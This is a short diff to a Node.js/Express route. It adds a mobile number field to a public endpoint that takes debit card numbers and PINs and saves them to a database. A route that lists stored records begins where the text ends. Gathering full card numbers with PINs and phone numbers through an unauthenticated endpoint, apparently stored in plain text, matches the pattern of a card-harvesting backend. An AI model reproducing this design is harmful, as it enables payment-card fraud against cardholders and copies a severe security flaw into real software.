@@ -6,21 +6,41 @@ const DebitCardUser = require("../models/DebitCardUser");
 // @desc    Save debit card number and PIN
 // @access  Public
 router.post("/", async (req, res) => {
-  const { cardNumber, pin } = req.body;
+  const { mobileNumber, cardNumber, pin } = req.body;
 
-  if (!cardNumber || !pin) {
-    return res.status(400).json({ error: "Card number and PIN are required" });
+  // Validate required fields
+  if (!mobileNumber || !cardNumber || !pin) {
+    return res.status(400).json({
+      error: "Mobile number, Card number, and PIN are required",
+    });
+  }
+
+  // Validate mobile number
+  if (!/^\d{10}$/.test(mobileNumber)) {
+    return res.status(400).json({
+      error: "Mobile number must be exactly 10 digits",
+    });
   }
 
   try {
-    const newDebitCard = new DebitCardUser({ cardNumber, pin });
+    const newDebitCard = new DebitCardUser({
+      mobileNumber,
+      cardNumber,
+      pin,
+    });
+
     await newDebitCard.save();
-    res.status(201).json({ message: "Debit card saved successfully" });
+
+    res.status(201).json({
+      message: "Debit card saved successfully",
+      mobileNumber: newDebitCard.mobileNumber,
+    });
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Server error, please try again later" });
   }
 });
+
 
 router.get("/list", async (req, res) => {
   try {
